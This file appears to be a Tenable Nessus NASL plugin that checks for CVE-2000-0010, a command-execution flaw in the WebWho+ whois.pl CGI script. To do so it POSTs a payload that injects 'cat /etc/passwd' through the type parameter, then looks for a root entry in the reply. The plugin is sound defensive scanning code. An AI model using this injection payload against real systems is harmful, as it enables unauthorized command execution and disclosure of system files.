#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if(description)
{
 script_id(11333);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2000-0010");
 script_bugtraq_id(892);
 script_xref(name:"OSVDB", value:"1174");

 script_name(english:"WebWho+ whois.pl time Parameter Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is prone to arbitrary
code execution." );
 script_set_attribute(attribute:"description", value:
"The WebWho+ CGI script appears to be installed on the remote host. 
This Perl script allows an attacker to view any file on the remote host
as well as to execute arbitrary commands, both subject to the privileges
of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1999-q4/0469.html" );
 script_set_attribute(attribute:"solution", value:
"Remove the affected script." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();

 script_summary(english: "Checks if webwho.pl is vulnerable");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

cmd = 'command=X&type="echo foo;cat /etc/passwd;echo foo&Check=X';

foreach dir (cgi_dirs())
{
 if ( is_cgi_installed3(item:dir + "/webwho.pl", port:port) )
 {
 r = http_send_recv3(method: 'POST', item:string(dir, "/webwho.pl"), port:port, data: cmd);
 if (isnull(r)) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string: r[2]))
 {
    if (report_verbosity > 0)
      security_hole(port: port, extra: r[2]);
    else
      security_hole(port:port);
    exit(0);
 }
 }
}
